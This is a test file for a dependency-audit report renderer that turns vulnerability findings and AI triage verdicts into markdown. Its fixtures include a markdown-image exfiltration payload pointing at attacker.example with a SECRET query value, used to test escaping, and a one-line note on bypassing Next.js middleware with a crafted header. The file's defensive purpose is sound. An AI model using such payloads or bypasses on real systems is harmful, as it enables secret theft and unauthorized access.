import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { loadPolicy } from '../lib/config/load';
import { decide } from './decide';
import { makeAdvisory, makeFinding, makeScan, makeVerdict, PROFILE } from './report-fixtures';
import { cell, code, inline, renderReport, renderSummary, reportItems, reportWarnings } from './report';
import type { ScanResult, TriageFailures } from './types';
import { VerdictStore } from './verdicts';

const ROOT = path.join(import.meta.dirname, '../..');
const POLICY = loadPolicy(ROOT);
const SHA = 'a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8c9d0';

// ---------- a realistic audit ----------

const next = makeFinding({
  osvId: 'GHSA-f82v-jwr5-mffw',
  packageName: 'next',
  installedVersions: ['15.1.0'],
  fixedVersions: ['15.2.3'],
  cves: ['CVE-2025-29927'],
  inKev: true,
  kevDateAdded: '2025-03-21',
  epss: 0.93,
  epssPercentile: 0.998,
  cvssScore: 9.1,
  priority: 'P0',
  priorityReasons: ['in CISA KEV since 2025-03-21', 'asset internet-facing', 'criticality high'],
});
const sentryNode = makeFinding({
  osvId: 'GHSA-6465-jgvq-jhgp',
  packageName: '@sentry/node',
  installedVersions: ['8.40.0'],
  fixedVersions: ['8.49.0'],
  cvssScore: 7.5,
  priority: 'P2',
  priorityReasons: ['CVSS 7.5 ≥ 7'],
  paths: [['@sentry/nextjs', '@sentry/node']],
  direct: false,
});
const sentryCore = makeFinding({
  osvId: 'GHSA-6465-jgvq-jhgp',
  packageName: '@sentry/core',
  installedVersions: ['8.40.0'],
  fixedVersions: ['8.49.0'],
  cvssScore: 7.5,
  priority: 'P2',
  priorityReasons: ['CVSS 7.5 ≥ 7'],
  paths: [['@sentry/nextjs', '@sentry/core']],
  direct: false,
});
const evil = makeFinding({
  osvId: 'MAL-2026-1234',
  packageName: 'evil-pkg',
  installedVersions: ['1.0.3'],
  fixedVersions: [],
  malicious: true,
  priority: 'P0',
  priorityReasons: ['malicious package (MAL-2026-1234)'],
  direct: false,
  devOnly: true,
  paths: [['eslint-plugin-foo', 'evil-pkg']],
});
const braces = makeFinding({
  osvId: 'GHSA-grv7-fg5c-xmjg',
  packageName: 'braces',
  installedVersions: ['3.0.2'],
  fixedVersions: ['3.0.3'],
  cves: ['CVE-2024-4068'],
  epss: 0.6,
  priority: 'P1',
  priorityReasons: ['EPSS 0.6 ≥ 0.5'],
  direct: false,
  paths: [['micromatch', 'braces']],
});
const cookie = makeFinding({
  osvId: 'GHSA-pxg6-pf52-xh8x',
  packageName: 'cookie',
  installedVersions: ['0.5.0'],
  fixedVersions: ['0.7.0'],
  cves: ['CVE-2024-47764'],
  cvssScore: 7.3,
  priority: 'P2',
  priorityReasons: ['CVSS 7.3 ≥ 7'],
});
const lodash = makeFinding({
  osvId: 'GHSA-35jh-r3h4-6jhm',
  packageName: 'lodash',
  installedVersions: ['4.17.20'],
  fixedVersions: ['4.17.21'],
  cves: ['CVE-2021-23337'],
  cvssScore: 7.2,
  priority: 'P2',
  priorityReasons: ['CVSS 7.2 ≥ 7'],
  devOnly: true,
});
const postcss = makeFinding({
  osvId: 'GHSA-7fh5-64p2-3v2j',
  packageName: 'postcss',
  installedVersions: ['8.4.20'],
  fixedVersions: ['8.4.31'],
  cves: ['CVE-2023-44270'],
  cvssScore: 5.3,
  priority: 'P3',
  priorityReasons: ['CVSS 5.3 < 7', 'no EPSS score'],
});

const advisories = [
  makeAdvisory({
    osvId: next.osvId,
    cves: ['CVE-2025-29927'],
    aliases: ['CVE-2025-29927'],
    summary: 'Authorization Bypass in Next.js Middleware',
  }),
  makeAdvisory({ osvId: sentryNode.osvId, summary: 'Sentry SDK leaks environment variables in <script> error pages' }),
  makeAdvisory({ osvId: evil.osvId, malicious: true, summary: 'Malicious code in evil-pkg (npm)' }),
  makeAdvisory({ osvId: braces.osvId, cves: ['CVE-2024-4068'], summary: 'Uncontrolled resource consumption in braces' }),
  makeAdvisory({
    osvId: cookie.osvId,
    cves: ['CVE-2024-47764'],
    summary: 'cookie accepts cookie name, path, and domain with out of bounds characters',
  }),
  makeAdvisory({ osvId: lodash.osvId, cves: ['CVE-2021-23337'], summary: 'Command Injection in lodash' }),
  makeAdvisory({ osvId: postcss.osvId, cves: ['CVE-2023-44270'], summary: 'PostCSS line return parsing error' }),
];

const verdicts = new VerdictStore([
  makeVerdict(next, {
    verdict: 'affected',
    confidence: 'high',
    runtime_usage: 'server',
    vulnerable_code_used: 'yes',
    attacker_reachable: 'yes',
    deployment_conditions_met: 'yes',
    summary: 'Middleware is the only authorization check for /admin, and the app is self-hosted with `next start`.',
    evidence: [
      { file: 'src/middleware.ts', line: 12, note: 'redirects unauthenticated users away from /admin' },
      { file: 'src/app/admin/page.tsx', line: null, note: 'no server-side session check of its own' },
    ],
    exploit_conditions: 'A request with an x-middleware-subrequest header skips middleware.\nNo login needed.',
    remediation: 'Upgrade next to 15.2.3 or later.',
    workaround: 'Strip the x-middleware-subrequest header at the load balancer.',
    suggested_action: 'ping',
    suggested_action_reason: 'Anyone on the internet can reach /admin without logging in.',
  }),
  makeVerdict(sentryNode, {
    verdict: 'likely_affected',
    confidence: 'medium',
    summary: 'The Node SDK renders error pages in production.',
    evidence: [{ file: 'sentry.server.config.ts', line: 4, note: 'Sentry.init with default integrations' }],
    exploit_conditions: 'An error page must be shown to an attacker.',
    remediation: 'Upgrade @sentry/nextjs to the latest 8.x release.',
    suggested_action: 'digest',
    suggested_action_reason: 'Real but needs an error page to be triggered.',
  }),
  makeVerdict(sentryCore, {
    verdict: 'not_affected',
    confidence: 'high',
    runtime_usage: 'build_or_tooling_only',
    suggested_action: 'log',
    suggested_action_reason: 'Core is only the shared base here.',
  }),
  makeVerdict(lodash, {
    verdict: 'not_affected',
    confidence: 'high',
    runtime_usage: 'build_or_tooling_only',
    suggested_action: 'log',
    suggested_action_reason: 'Only `template | trim` in a build script reads it. Never at runtime.',
  }),
]);
const failures: TriageFailures = {
  [cookie.id]: { inputHash: cookie.inputHash, error: 'claude error_max_turns: reached max turns | 30', at: '2026-11-12T09:30:00Z' },
};

function audit(o: Partial<ScanResult> = {}) {
  const scan = makeScan([next, sentryNode, sentryCore, evil, braces, cookie, lodash, postcss], advisories, { commit: SHA, ...o });
  const decisions = decide(scan, verdicts, failures, POLICY, PROFILE);
  const report = renderReport({
    scan,
    decisions,
    profile: PROFILE,
    generatedAt: '2026-11-12T10:05:00.000Z',
    toolVersion: '0.1.0',
    timeZone: 'UTC',
  });
  return { scan, decisions, report, lines: report.split('\n') };
}

describe('renderReport', () => {
  it('renders the header, counts, legend and the sections in order', () => {
    const { report, lines } = audit();
    expect(lines.slice(0, 7)).toEqual([
      '# Dependency audit: Demo Web',
      '',
      'Audited `main` at `a1b2c3d` (committed 2026-11-10) · 1 lockfile · 812 packages · generated 2026-11-12 10:05 UTC',
      '',
      '**Fix now 3 · Fix soon 2 · Logged 2** (3 of these 7 items not triaged yet; placed by their signals)',
      '',
      '**Fix now**: real harm is possible soon; fix today. **Fix soon**: real but not urgent; fix within 1–2 weeks. **Logged**: not a real threat in this project; no action needed.',
    ]);
    const headings = lines.filter((l) => l.startsWith('#'));
    expect(headings).toEqual([
      '# Dependency audit: Demo Web',
      '## Warnings',
      '## Fix now (3)',
      '### evil-pkg@1.0.3 — Malicious code in evil-pkg (npm)',
      '### next@15.1.0 — Authorization Bypass in Next.js Middleware',
      '### braces@3.0.2 — Uncontrolled resource consumption in braces',
      '## Fix soon (2)',
      '### @sentry/node@8.40.0, @sentry/core@8.40.0 — Sentry SDK leaks environment variables in \\<script> error pages',
      '### cookie@0.5.0 — cookie accepts cookie name, path, and domain with out of bounds characters',
      '## Logged (2)',
      '## Not triaged (3)',
    ]);
    expect(report.endsWith('so teammates reuse these verdicts.\n')).toBe(true);
  });

  it('matches the example report (a reviewable rendering of the whole fixture)', async () => {
    await expect(audit().report).toMatchFileSnapshot('./__snapshots__/report.example.md');
  });

  it('shows a triaged item with why, verdict and signals, evidence, fix and dependency', () => {
    const { report } = audit();
    const item = report.slice(report.indexOf('### next@'), report.indexOf('### braces@'));
    expect(item).toBe(
      [
        '### next@15.1.0 — Authorization Bypass in Next.js Middleware',
        '',
        '[GHSA-f82v-jwr5-mffw](https://osv.dev/vulnerability/GHSA-f82v-jwr5-mffw) · CVE-2025-29927 · `package-lock.json`',
        '',
        '- **Why:** Anyone on the internet can reach /admin without logging in.',
        '- **Verdict:** affected, high confidence · P0 · CVSS 9.1 · exploited in the wild (CISA KEV, since 2025-03-21) · EPSS 93%',
        '- **Summary:** Middleware is the only authorization check for /admin, and the app is self-hosted with `next start`.',
        '- **Exploitable when:** A request with an x-middleware-subrequest header skips middleware. No login needed.',
        '- **Where in the code:**',
        '  - `src/middleware.ts:12` — redirects unauthenticated users away from /admin',
        '  - `src/app/admin/page.tsx` — no server-side session check of its own',
        '- **Fix:** Upgrade next to 15.2.3 or later. Workaround: Strip the x-middleware-subrequest header at the load balancer.',
        '- **Dependency:** direct',
        '',
        '',
      ].join('\n'),
    );
  });

  it('shows one item for one advisory on two packages, led by the package whose own verdict placed it', () => {
    const { report } = audit();
    const item = report.slice(report.indexOf('### @sentry/node'), report.indexOf('### cookie@'));
    expect(item).toContain('- **Why:** Real but needs an error page to be triggered.\n');
    expect(item).toContain('- **Verdict:** likely affected, medium confidence · P2 · CVSS 7.5\n');
    expect(item).toContain('- **Dependency:** transitive via `@sentry/nextjs > @sentry/node`\n');
    expect(item).toContain(
      '- **Same advisory, also in:** `@sentry/core@8.40.0` (not affected, high confidence; raised to match). One fix usually covers all of them.\n',
    );
    expect(item).not.toContain('Placement');
  });

  it('shows the malicious package with the fixed remediation and no AI verdict', () => {
    const { report } = audit();
    const item = report.slice(report.indexOf('### evil-pkg@'), report.indexOf('### next@'));
    expect(item).toContain('- **Signals:** P0 · malicious package. No AI triage needed: malicious packages always go to Fix now.\n');
    expect(item).toContain(
      '- **Fix:** Remove the package, reinstall from a clean state, and rotate every secret that was on the affected machines or in CI.\n',
    );
    expect(item).toContain('- **Dependency:** transitive, dev only via `eslint-plugin-foo > evil-pkg`\n');
  });

  it('says plainly that an untriaged item is placed by its signals and how to triage it', () => {
    const { report } = audit();
    const item = report.slice(report.indexOf('### braces@'), report.indexOf('## Fix soon'));
    expect(item).toContain(
      '- **Why:** Not triaged yet, so there is no verdict. It is in Fix now because of its signals alone: P1 (EPSS 0.6 ≥ 0.5). Run `/vigiles:audit` again to triage it.\n',
    );
    expect(item).toContain('- **Signals:** P1 · EPSS 60%\n- **Fix:** Fixed in 3.0.3.\n');
    const failed = report.slice(report.indexOf('### cookie@'), report.indexOf('## Logged'));
    expect(failed).toContain('- **Why:** Triage failed (claude error_max_turns: reached max turns | 30), so there is no verdict yet.');
  });

  it('folds logged items into a table, escaping | and newlines', () => {
    const { report } = audit();
    const logged = report.slice(report.indexOf('## Logged'), report.indexOf('## Not triaged'));
    expect(logged.split('\n')).toEqual([
      '## Logged (2)',
      '',
      '<details>',
      '<summary>2 items with no action needed (1 of them not triaged yet, placed here by their signals)</summary>',
      '',
      '| Package | Advisory | Priority | Why |',
      '|---|---|---|---|',
      '| lodash@4.17.20 | CVE-2021-23337 | P2 | not affected: Only `template \\| trim` in a build script reads it. |',
      '| postcss@8.4.20 | CVE-2023-44270 | P3 | not triaged yet; placed by its signals |',
      '',
      '</details>',
      '',
      '',
    ]);
  });

  it('lists findings without a verdict, most urgent first, folded away', () => {
    const { report } = audit();
    const section = report.slice(report.indexOf('## Not triaged'), report.indexOf('\n---\n'));
    expect(section).toContain('\n<details>\n<summary>1 failed, 2 not triaged yet</summary>\n');
    expect(section.trimEnd().endsWith('</details>')).toBe(true);
    expect(section.split('\n').filter((l) => l.startsWith('| ') && !l.startsWith('| Package'))).toEqual([
      '| braces@3.0.2 | CVE-2024-4068 | P1 | Fix now | not triaged yet |',
      '| cookie@0.5.0 | CVE-2024-47764 | P2 | Fix soon | failed: claude error_max_turns: reached max turns \\| 30 |',
      '| postcss@8.4.20 | CVE-2023-44270 | P3 | Logged | not triaged yet |',
    ]);
  });

  it('ends with the data dates, triage config, policy and version', () => {
    const { report, decisions } = audit({
      data: { osvDbDate: '2026-11-12', kevCatalogDate: null, kevAvailable: false, epssDate: '2026-11-12', epssFailedCves: 0 },
    });
    expect(report).toContain(
      `Data: OSV database 2026-11-12 · CISA KEV unavailable · EPSS 2026-11-12. Triage: v3-opus-high-code (prompt v3@1a2b3c4d). Policy ${decisions.policyHash}. Vigiles 0.1.0.`,
    );
    expect(report).toContain('- The CISA KEV catalog was unavailable');
  });

  it('is stable: the same input renders the same bytes whatever the finding order', () => {
    const a = audit().report;
    const { scan } = audit();
    const shuffled = { ...scan, findings: [...scan.findings].reverse() };
    const b = renderReport({
      scan: shuffled,
      decisions: decide(shuffled, verdicts, failures, POLICY, PROFILE),
      profile: PROFILE,
      generatedAt: '2026-11-12T10:05:00.000Z',
      toolVersion: '0.1.0',
      timeZone: 'UTC',
    });
    expect(b).toBe(a);
  });

  it('handles a clean audit', () => {
    const scan = makeScan([], [], { commit: SHA });
    const report = renderReport({
      scan,
      decisions: decide(scan, new VerdictStore(), {}, POLICY, PROFILE),
      profile: PROFILE,
      generatedAt: '2026-11-12T10:05:00.000Z',
      toolVersion: '0.1.0',
      timeZone: 'UTC',
    });
    expect(report).toContain('**Fix now 0 · Fix soon 0 · Logged 0**\n');
    expect(report).toContain('No known vulnerabilities in the audited lockfiles.');
    expect(report).not.toContain('## Warnings');
  });

  it('marks evidence from an older commit and the policy overriding the AI', () => {
    const p1 = makeFinding({ osvId: 'GHSA-p1', packageName: 'ws', priority: 'P1', epss: 0.7, priorityReasons: ['EPSS 0.7 ≥ 0.5'] });
    const v = makeVerdict(
      p1,
      { verdict: 'likely_not_affected', suggested_action: 'log', evidence: [{ file: 'a.ts', line: 1, note: 'n' }] },
      { commit: 'ffffffffffffffffffffffffffffffffffffffff' },
    );
    const scan = makeScan([p1], [makeAdvisory({ osvId: 'GHSA-p1' })], { commit: SHA });
    const report = renderReport({
      scan,
      decisions: decide(scan, new VerdictStore([v]), {}, POLICY, PROFILE),
      profile: PROFILE,
      generatedAt: '2026-11-12T10:05:00.000Z',
      toolVersion: '0.1.0',
      timeZone: 'UTC',
    });
    expect(report).toContain('- **Placement:** the AI suggested Logged; policy rule `p1-floor` puts it in Fix soon.\n');
    expect(report).toContain('- **Where in the code (as of `fffffff`):**\n');
  });
});

describe('reportWarnings', () => {
  it('lists structured problems once, without repeating what the scan already warned about', () => {
    const { scan, decisions } = audit();
    const warnings = reportWarnings(
      {
        ...scan,
        uncommittedDependencyFiles: ['package-lock.json'],
        skippedLockfiles: ['yarn.lock', 'apps/x/pnpm-lock.yaml'],
        coverageGaps: ['apps/x/pnpm-lock.yaml', 'tools/deno.json', 'yarn.lock'],
        warnings: ['apps/x/pnpm-lock.yaml could not be parsed', 'EPSS lookup failed for 2 CVEs'],
        data: { ...scan.data, epssFailedCves: 2 },
      },
      decisions,
      ['profile.yaml: deployments still contains a placeholder', 'EPSS lookup failed for 2 CVEs'],
    );
    expect(warnings).toEqual([
      'Not audited: uncommitted changes in `package-lock.json`. This audit read the committed state; commit them and run again to include them.',
      'No lockfile, so their dependencies were not audited: `tools/deno.json`.',
      'Skipped (could not be read): `yarn.lock`.',
      'apps/x/pnpm-lock.yaml could not be parsed',
      'EPSS lookup failed for 2 CVEs',
      'profile.yaml: deployments still contains a placeholder',
      '3 findings without a verdict (1 failed, 2 not triaged yet): placed by their signals alone. See Not triaged; run `/vigiles:audit` again to triage them.',
    ]);
  });
});

describe('reportItems', () => {
  it('groups by (action, lockfile, advisory) and orders by action, priority, CVSS, name', () => {
    const { decisions } = audit();
    expect(reportItems(decisions).map((i) => `${i.action} ${i.priority} ${i.members.map((m) => m.finding.packageName).join('+')}`)).toEqual(
      [
        'ping P0 evil-pkg',
        'ping P0 next',
        'ping P1 braces',
        'digest P2 @sentry/node+@sentry/core',
        'digest P2 cookie',
        'log P2 lodash',
        'log P3 postcss',
      ],
    );
  });
});

describe('renderSummary', () => {
  it('prints the counts, the Fix now and Fix soon items and the report path', () => {
    const { scan, decisions } = audit();
    expect(renderSummary(decisions, scan, '/repos/demo-web/.vigiles/report.md').split('\n')).toEqual([
      'Fix now 3 · Fix soon 2 · Logged 2 (main @ a1b2c3d); 3 of these 7 items not triaged yet',
      'Fix now:',
      '  - evil-pkg@1.0.3 — Malicious code in evil-pkg (npm) (MAL-2026-1234)',
      '  - next@15.1.0 — Authorization Bypass in Next.js Middleware (CVE-2025-29927)',
      '  - braces@3.0.2 — Uncontrolled resource consumption in braces (CVE-2024-4068) [not triaged]',
      'Fix soon:',
      '  - @sentry/node@8.40.0, @sentry/core@8.40.0 — Sentry SDK leaks environment variables in <script> error pages (GHSA-6465-jgvq-jhgp)',
      '  - cookie@0.5.0 — cookie accepts cookie name, path, and domain with out of bounds characters (CVE-2024-47764) [not triaged]',
      'Report: /repos/demo-web/.vigiles/report.md',
    ]);
  });
});

describe('dependency line', () => {
  it('names a direct dependency as direct even when other packages also pull it in', () => {
    const f = makeFinding({
      osvId: 'GHSA-dddd-dddd-dddd',
      packageName: 'next',
      direct: true,
      paths: [['@storybook/nextjs-vite', 'next'], ['next']],
      cvssScore: 9.5,
      priority: 'P1',
    });
    const scan = makeScan([f], [makeAdvisory({ osvId: f.osvId, summary: 'RCE' })]);
    const decisions = decide(scan, new VerdictStore(), {}, POLICY, PROFILE);
    const report = renderReport({
      scan,
      decisions,
      profile: PROFILE,
      generatedAt: '2026-11-12T10:00:00Z',
      toolVersion: 't',
      timeZone: 'UTC',
    });
    expect(report).toContain('- **Dependency:** direct (also via `@storybook/nextjs-vite > next`)\n');
  });
});

describe('text helpers', () => {
  it('inline collapses whitespace and escapes tag-like <; cell also escapes |', () => {
    expect(inline('a\n  b <img src=x> 1 < 2')).toBe('a b \\<img src=x> 1 < 2');
    expect(cell('x | y\nz')).toBe('x \\| y z');
  });

  it('inline lets no link or image form from untrusted text', () => {
    expect(inline('![](https://x.example/p?c=1) [a](https://y) <https://z>')).toBe(
      '!\\[\\](https://x.example/p?c=1) \\[a\\](https://y) \\<https://z>',
    );
    // A backslash in the text cannot undo the escape that follows it.
    expect(inline('\\](x)')).toBe('\\\\\\](x)');
  });

  it('code fences any run of backticks and stays on one line', () => {
    expect(code('a.ts')).toBe('`a.ts`');
    expect(code('a`b')).toBe('`` a`b ``');
    expect(code('x``y\n](https://e)')).toBe('``` x``y ](https://e) ```');
  });
});

describe('untrusted text in the report', () => {
  const evilSummary = 'Bug ![p](https://attacker.example/p.png?c=SECRET) see [docs](https://attacker.example)';
  function render() {
    const f = makeFinding({ osvId: 'GHSA-evil', packageName: 'lib', priority: 'P1', epss: 0.7, priorityReasons: ['EPSS 0.7 ≥ 0.5'] });
    const v = makeVerdict(f, {
      verdict: 'affected',
      suggested_action: 'ping',
      remediation: '![](https://x.example/p?c=1) [a](https://y)',
      evidence: [{ file: 'src/x``y.ts\nbad', line: 3, note: 'n' }],
    });
    const scan = makeScan([f], [makeAdvisory({ osvId: f.osvId, summary: evilSummary })], { commit: SHA });
    const decisions = decide(scan, new VerdictStore([v]), {}, POLICY, PROFILE);
    return renderReport({ scan, decisions, profile: PROFILE, generatedAt: '2026-11-12T10:05:00Z', toolVersion: 't', timeZone: 'UTC' });
  }

  it('escapes links and images in advisory summaries and model output, and keeps evidence paths in one code span', () => {
    const report = render();
    expect(report).toContain('### lib@1.0.0 — Bug !\\[p\\](https://attacker.example/p.png?c=SECRET) see \\[docs\\](https://attacker.example)\n');
    expect(report).toContain('- **Fix:** !\\[\\](https://x.example/p?c=1) \\[a\\](https://y)');
    expect(report).toContain('  - ``` src/x``y.ts bad:3 ``` — n\n');
    // No unescaped `[...](` anywhere outside the links Vigiles writes itself (the advisory id).
    const unescaped = report.split('\n').filter((l) => /(^|[^\\])\]\(/.test(l) && !l.startsWith('[GHSA-evil](https://osv.dev/'));
    expect(unescaped).toEqual([]);
  });
});

describe('several lockfiles', () => {
  it('names the lockfile of each row in the tables and of each summary line', () => {
    const apps = ['apps/web/package-lock.json', 'apps/api/package-lock.json'];
    const logged = apps.map((lockfile) =>
      makeFinding({ osvId: 'GHSA-mini', packageName: 'minimatch', installedVersions: ['3.0.4'], lockfile, priority: 'P3' }),
    );
    const pending = apps.map((lockfile) =>
      makeFinding({ osvId: 'GHSA-semv', packageName: 'semver', lockfile, priority: 'P1', epss: 0.7, priorityReasons: ['EPSS 0.7 ≥ 0.5'] }),
    );
    const verdicts = new VerdictStore(logged.map((f) => makeVerdict(f, { verdict: 'not_affected', suggested_action: 'log' })));
    const scan = makeScan([...logged, ...pending], [makeAdvisory({ osvId: 'GHSA-mini' }), makeAdvisory({ osvId: 'GHSA-semv', summary: 'semver ReDoS' })], {
      commit: SHA,
      lockfiles: apps,
    });
    const decisions = decide(scan, verdicts, {}, POLICY, PROFILE);
    const report = renderReport({ scan, decisions, profile: PROFILE, generatedAt: '2026-11-12T10:05:00Z', toolVersion: 't', timeZone: 'UTC' });
    const rows = report.split('\n').filter((l) => l.startsWith('| '));
    expect(rows).toContain('| Package | Lockfile | Advisory | Priority | Why |');
    expect(rows.filter((r) => r.startsWith('| minimatch@3.0.4 | apps/'))).toHaveLength(2);
    expect(rows).toContain('| Package | Lockfile | Advisory | Priority | Placed in | Status |');
    expect(rows.filter((r) => r.startsWith('| semver@1.0.0 | apps/'))).toHaveLength(2);
    const summary = renderSummary(decisions, scan).split('\n');
    expect(summary).toContain('  - semver@1.0.0 — semver ReDoS (GHSA-semv) in apps/api/package-lock.json [not triaged]');
    expect(summary).toContain('  - semver@1.0.0 — semver ReDoS (GHSA-semv) in apps/web/package-lock.json [not triaged]');
  });
});
